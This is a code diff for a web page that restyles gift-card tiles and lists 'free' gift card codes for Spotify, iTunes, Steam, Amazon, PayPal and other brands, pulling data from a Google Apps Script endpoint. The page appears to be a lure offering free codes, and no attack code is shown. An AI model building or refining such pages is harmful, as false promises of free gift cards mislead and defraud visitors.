@@ -18,7 +18,7 @@ body{background:#2f3136;color:#fff}
 
 .slider{
   width:260px;
-  height:150px;
+  height:170px;
   margin:0 auto 25px;
   position:relative;
   overflow:hidden;
@@ -30,20 +30,50 @@ body{background:#2f3136;color:#fff}
   animation:slide 6s infinite;
 }
 
-.cards div{
+.cards .gift{
   width:260px;
-  height:150px;
-  border-radius:14px;
+  height:170px;
+  border-radius:18px;
   display:flex;
+  flex-direction:column;
   align-items:center;
   justify-content:center;
-  font-size:32px;
+  position:relative;
+}
+
+/* small hole on top */
+.cards .gift:before{
+  content:"";
+  position:absolute;
+  top:8px;
+  width:70px;
+  height:16px;
+  background:#2f3136;
+  border-radius:0 0 12px 12px;
+}
+
+.gift img{
+  width:64px;
+  margin-bottom:10px;
+  filter:invert(1);
+}
+
+.gift .name{
+  font-size:18px;
+  font-weight:bold;
+  margin-bottom:8px;
+}
+
+.gift .price{
+  font-size:26px;
   font-weight:bold;
 }
 
-.c1{background:#0f9d58}
-.c2{background:#0097a7}
-.c3{background:#c62828}
+/* colors for top cards */
+
+.gc1{background:#1db954;}   /* spotify */
+.gc2{background:#ff4f81;}   /* itunes */
+.gc3{background:#0097a7;}   /* google play */
 
 @keyframes slide{
   0%{transform:translateX(0)}
@@ -72,13 +102,6 @@ body{background:#2f3136;color:#fff}
   cursor:pointer;
   transition:.4s;
   overflow:hidden;
-
-  /* ✅ thoda right side upar tilt */
-  transform:skewY(-4deg);
-}
-
-.strip > *{
-  transform:skewY(4deg);
 }
 
 .strip img{
@@ -90,12 +113,6 @@ body{background:#2f3136;color:#fff}
 .strip span{
   font-size:15px;
   letter-spacing:1px;
-}
-
-.amount{
-  font-size:22px;
-  font-weight:bold;
-  margin-top:4px;
 }
 
 .more{
@@ -145,9 +162,28 @@ body{background:#2f3136;color:#fff}
 
   <div class="slider">
     <div class="cards">
-      <div class="c1">$10</div>
-      <div class="c2">$25</div>
-      <div class="c3">$50</div>
+
+      <!-- TOP CARD 1 -->
+      <div class="gift gc1">
+        <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/spotify.svg">
+        <div class="name">Spotify</div>
+        <div class="price">$60</div>
+      </div>
+
+      <!-- TOP CARD 2 -->
+      <div class="gift gc2">
+        <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/apple.svg">
+        <div class="name">iTunes</div>
+        <div class="price">$100</div>
+      </div>
+
+      <!-- TOP CARD 3 -->
+      <div class="gift gc3">
+        <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/googleplay.svg">
+        <div class="name">Google Play</div>
+        <div class="price">$25</div>
+      </div>
+
     </div>
   </div>
 
@@ -155,10 +191,11 @@ body{background:#2f3136;color:#fff}
 </div>
 
 
+<!-- ================== BELOW PART SAME AS YOUR CODE ================== -->
+
 <div class="strip google expand">
   <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/googleplay.svg">
   <span>Google Play</span>
-  <div class="amount">$25</div>
   <div class="more">
     Get free Google Play Gift Card code and redeem for anything in the Google Play Store.
     <br>
@@ -169,7 +206,6 @@ body{background:#2f3136;color:#fff}
 <div class="strip xbox expand">
   <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/xbox.svg">
   <span>XBOX</span>
-  <div class="amount">$50</div>
   <div class="more">
     Get free Xbox Gift Card code and redeem for games and content on the Xbox Store.
     <br>
@@ -180,7 +216,6 @@ body{background:#2f3136;color:#fff}
 <div class="strip steam expand">
   <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/steam.svg">
   <span>STEAM</span>
-  <div class="amount">$50</div>
   <div class="more">
     Get free Steam Gift Card code and redeem for games and content on the Steam Store.
     <br>
@@ -191,7 +226,6 @@ body{background:#2f3136;color:#fff}
 <div class="strip ps expand">
   <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/playstation.svg">
   <span>PlayStation</span>
-  <div class="amount">$50</div>
   <div class="more">
     Get free PlayStation Gift Card code and redeem for games and content on the PlayStation Store.
     <br>
@@ -202,7 +236,6 @@ body{background:#2f3136;color:#fff}
 <div class="strip spotify expand">
   <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/spotify.svg">
   <span>Spotify</span>
-  <div class="amount">$60</div>
   <div class="more">
     Get free Spotify Gift Card code and redeem for premium subscription on Spotify.
     <br>
@@ -213,7 +246,6 @@ body{background:#2f3136;color:#fff}
 <div class="strip itunes expand">
   <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/apple.svg">
   <span>iTunes</span>
-  <div class="amount">$100</div>
   <div class="more">
     Get free Apple iTunes Gift Card code and redeem on the Apple App Store and iTunes Store.
     <br>
@@ -224,7 +256,6 @@ body{background:#2f3136;color:#fff}
 <div class="strip paypal expand">
   <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/paypal.svg">
   <span>PayPal</span>
-  <div class="amount">$25</div>
   <div class="more">
     Get free PayPal Gift Card code and use it for payments on PayPal.
     <br>
@@ -235,7 +266,6 @@ body{background:#2f3136;color:#fff}
 <div class="strip amazon expand">
   <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/amazon.svg">
   <span>Amazon</span>
-  <div class="amount">$50</div>
   <div class="more">
     Get free Amazon Gift Card code and redeem for anything on Amazon.
     <br>
@@ -245,7 +275,6 @@ body{background:#2f3136;color:#fff}
 
 <div class="strip walmart expand">
   <span>Walmart</span>
-  <div class="amount">$50</div>
   <div class="more">
     Get free Walmart Gift Card code and redeem for shopping on Walmart.
     <br>
@@ -255,7 +284,6 @@ body{background:#2f3136;color:#fff}
 
 <div class="strip target expand">
   <span>Target</span>
-  <div class="amount">$50</div>
   <div class="more">
     Get free Target Gift Card code and redeem for shopping on Target.
     <br>
@@ -265,7 +293,6 @@ body{background:#2f3136;color:#fff}
 
 <div class="strip bestbuy expand">
   <span>BestBuy</span>
-  <div class="amount">$50</div>
   <div class="more">
     Get free Best Buy Gift Card code and redeem for shopping on Best Buy.
     <br>
@@ -275,7 +302,6 @@ body{background:#2f3136;color:#fff}
 
 <div class="strip uber expand">
   <span>Uber</span>
-  <div class="amount">$25</div>
   <div class="more">
     Get free Uber Gift Card code and redeem for rides and food on Uber.
     <br>
@@ -285,7 +311,6 @@ body{background:#2f3136;color:#fff}
 
 <div class="strip doordash expand">
   <span>DoorDash</span>
-  <div class="amount">$25</div>
   <div class="more">
     Get free DoorDash Gift Card code and redeem for food delivery on DoorDash.
     <br>
@@ -293,8 +318,9 @@ body{background:#2f3136;color:#fff}
   </div>
 </div>
 
-
 <script>
+
+/* expand all */
 
 document.querySelectorAll(".expand").forEach(card=>{
   card.addEventListener("click",function(e){
@@ -303,6 +329,7 @@ document.querySelectorAll(".expand").forEach(card=>{
   });
 });
 
+/* GOOGLE SHEET CONNECT */
 
 fetch("https://script.google.com/macros/s/AKfycbyisqmojcVZqgcNyTuXd5y7tfiq30nWpYb8t1NQmRqBP6vIGBzwgq_M-zzM-uPs7RI/exec")
 .then(r=>r.json())
